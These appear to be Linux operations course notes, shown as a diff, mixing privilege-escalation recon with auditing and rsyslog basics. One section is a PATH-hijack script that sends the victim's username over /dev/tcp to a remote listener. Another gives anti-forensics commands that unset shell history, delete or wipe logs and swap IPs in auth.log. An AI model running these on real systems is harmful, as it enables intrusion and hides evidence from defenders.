@@ -15,25 +15,85 @@ Take note of commands that are allowed, input command into GTFO-Bins
 - find / -type f -perm /6000 -ls 2>/dev/null
                          |______________________SUID and SGID 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CronJobs
 
+find /var/spool/cron/crontabs /etc/cron* -writable -ls - finds any cron file or directory that can be written to.
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+World Writable Files
 
+find / -type f -perm /2 -o -type d -perm /2 2>/dev/null - Search for any file or directory that is writable by the context "other"]
+find / -type f -writable -o -type d -writable 2>/dev/null - Search for any file or directory that is writable by the current use
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Dot '.' in PATH
 
+#!/bin/bash
+# script that sends information to a remote system.
+echo "exec 3<>/dev/tcp/192.168.1.40/4444" > /tmp/ls-l
+echo "echo \$(whoami) logged in on \$(date) >&3" >> /tmp/ls-l
+chmod +x /tmp/ls-l
+
+nc -lp 4444 - From lin-ops
+
+bill logged in on Fri 19 Apr 2019 02:10:35 PM EDT - Once they type the desired command, we get this ouput
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+NIX-ism
 
+- unset HISTFILE
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Ways To Figure Out Init Type
 
+- ls -latr /proc/1/exe
+- stat /sbin/init
+- man init
+- init --version
+- ps 1
 
+Auditing SystemV
+- ausearch -p 22
+- ausearch -m USER_LOGIN -sv no
+- ausearch -ua edwards -ts yesterday -te now -i
+
+Auditing SystemD
+- journalctl _TRANSPORT=audit
+- journalctl _TRANSPORT=audit | grep 603
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reading Files
 
+- cat /var/log/auth.log | egrep -v "opened|closed"
+- awk '/opened/' /var/log/auth.log
+- last OR lastb OR lastlog
+- strings OR dd            # for data files
+- more /var/log/syslog
+- head/tail
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Cleaning Logs
 
+Get Rid of It
+- rm -rf /var/log/...
+
+Clear It
+- cat /dev/null > /var/log/...
+- echo > /var/log/...
+
+Grep (Remove)
+- egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+
+Sed (Replace)
+- cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reading Rsyslog
+- Utilizes severity (priority) and facility levels
+- Rules filter out, and can use keyword or number
 
+<facility>.<priority>
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Rsyslog Examples
 
-
+kern.*                                                                      # All kernel messages, all severities
+mail.crit
+cron.!info,!debug
+*.*  @192.168.10.254:514                                                    # Old format
+*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")  # New format
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
